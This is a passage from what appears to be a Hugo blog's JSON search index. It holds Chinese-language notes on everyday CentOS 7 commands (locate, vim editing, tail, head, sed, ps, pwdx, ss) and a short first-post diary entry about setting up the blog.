/home/redis-6.2.0/src/redis-check-aof.o /home/redis-6.2.0/src/redis-check-rdb /home/redis-6.2.0/src/redis-check-rdb.c /home/redis-6.2.0/src/redis-check-rdb.d /home/redis-6.2.0/src/redis-check-rdb.o /home/redis-6.2.0/src/redis-cli /home/redis-6.2.0/src/redis-cli.c /home/redis-6.2.0/src/redis-cli.d /home/redis-6.2.0/src/redis-cli.o /home/redis-6.2.0/src/redis-sentinel /home/redis-6.2.0/src/redis-server /home/redis-6.2.0/src/redis-trib.rb /home/redis-6.2.0/src/redis.conf /home/redis-6.2.0/src/redisassert.h /home/redis-6.2.0/src/redismodule.h 然后新建一个文件，再查询一次 [root@rui redis-6.2.0]# \u003e /home/redis-6.2.0/src/testfile [root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/testf [root@rui redis-6.2.0]# ll /home/redis-6.2.0/src/testfile -rw-r--r--. 1 root root 0 Apr 10 22:37 /home/redis-6.2.0/src/testfile 可以看到，没有查到，因为locate的数据库不是实时更新的，可以使用updatedb手动更新，也可以把更新命令配置到系统的任务计划表，定时执行 [root@rui redis-6.2.0]# updatedb [root@rui redis-6.2.0]# locate /home/redis-6.2.0/src/testf /home/redis-6.2.0/src/testfile 可以看到更新之后就查到了 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:1:3","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"vim相关 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"进入编辑模式 按i进入编辑模式后光标会在当前位置 按I进入编辑模式后光标会在当前行行首 按a进入编辑模式后，光标在当前字符后 按A进入编辑模式后，光标会在当前行行尾 按o进入编辑模式后，会在当前行下一行新开一行 按O进入编辑模式后，会在当前行上一行新开一行 我用的最多的是i ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"退出编辑模式 按ESC退出编辑模式 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查找 使用：/要查找的内容 使用vim /文件名打开文件后，输入/要查找的内容即可，比如下面我要在redis.conf配置文件中查找bind关键字 然后可以输入回车，会查找到该文件中第一个bind，可以输入n定位到下一个，输入N定位到上一个 取消高亮可以输入nohlsearch，简写为noh，也可以输入set nohlsearch ，简写为set noh ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:3","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"替换 把文件中的所有127.0.0.1替换为120.5.5.153 使用：:%s/127.0.0.1/120.5.5.153/g 把当前行的127.0.0.1替换为120.5.5.153 使用：:S/127.0.0.1/120.5.5.153/g 还有很多替换相关的命令，这里只是写了常用的 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:4","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"退出 退出不保存:q 强制退出不保存:q! 保存并退出:wq 强制保存并退出:wq! ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:2:5","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看日志 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:3:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"实时刷新查看日志 方式一：使用：tail -f -n 10 日志文件名称 -f：实时刷新 -n：行数关键字，后面跟行数，表示从后10行开始查看 方式二：使用：tailf 日志文件名称 默认从后十行开始查看 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:3:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看日志前10行 使用：head -n 行数 日志文件名称 -n ：行数关键字 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:3:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看第10行到第20行 方式一：使用：sed -n '10,20p' 日志文件名称 -n：打印制定行 '10,20p'：指定的行号 方式二：使用：cat -n 日志文件名称 | head -n 20 | tail -n +10 cat -n：打印日志显示行号 head -n 20：打印到20行 tail -n +10：从第10行开始打印 2021.04.20 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:3:3","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看进程 ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:4:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"ps命令 ps （英文全拼：process status）命令用于显示当前进程的状态 –摘自菜鸟教程 参数 -a：列出所有进程 -w：显示加宽，可以显示更多内容 -u：以用户为主的进程状态 -x：显示当前用户在所有终端下的进程信息，通常和参数a一起使用 -e：显示系统内所有的进程信息 -l：使用长格式显示进程信息 -f：使用完整的格式显示进程信息 筛选 在输入了上面命令后添加|grep processName/processID ps -aux |grep mysql ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:4:1","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"根据进程查找文件 当因为某种原因找不到服务的存放位置时，可以使用上面的命令先查看进程的ID 然后使用命令：pwdx processID命令查找该进程文件存放的位置 [root@rabbitmq1 redis]# ps -aux |grep redis redis 4356 0.1 2.3 323184 133272 ? Ssl 4月19 25:12 /usr/bin/redis-server *:6379 root 7194 0.0 0.0 112736 996 pts/1 S+ 11:23 0:00 grep --color=auto redis [root@rabbitmq1 redis]# pwdx 4356 4356: /var/lib/redis ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:4:2","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":["linux"],"content":"查看端口号是否被监听 [root@pacs local]# ss -tunlp |grep 3306 tcp LISTEN 0 128 *:3306 *:* users:((\"docker-proxy\",pid=28320,fd=4)) ","date":"2021-04-10","objectID":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/:5:0","tags":["linux"],"title":"linux(Centos7)相关命令 持续更新...","uri":"/posts/linuxcentos7%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"},{"categories":null,"content":"第一篇文章 写点儿啥呢 这两天一直在弄博客，昨天弄了一天icon， hugo的文档有点儿多，没找到config.toml的说明文档 [手动笑哭] 最后各种Google，昨晚终于弄好了 其实昨天一直边玩儿边搞，在家弄效率是不太高 ^_^ 但是这个为啥不兼容markdown的表情 ToT 今天是清明节，本来打算回家…，改到五一假期再回吧 祝自个儿下周二顺利吧 开始学习… ","date":"2021-04-04","objectID":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/:0:0","tags":null,"title":"第一篇文章","uri":"/posts/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"}]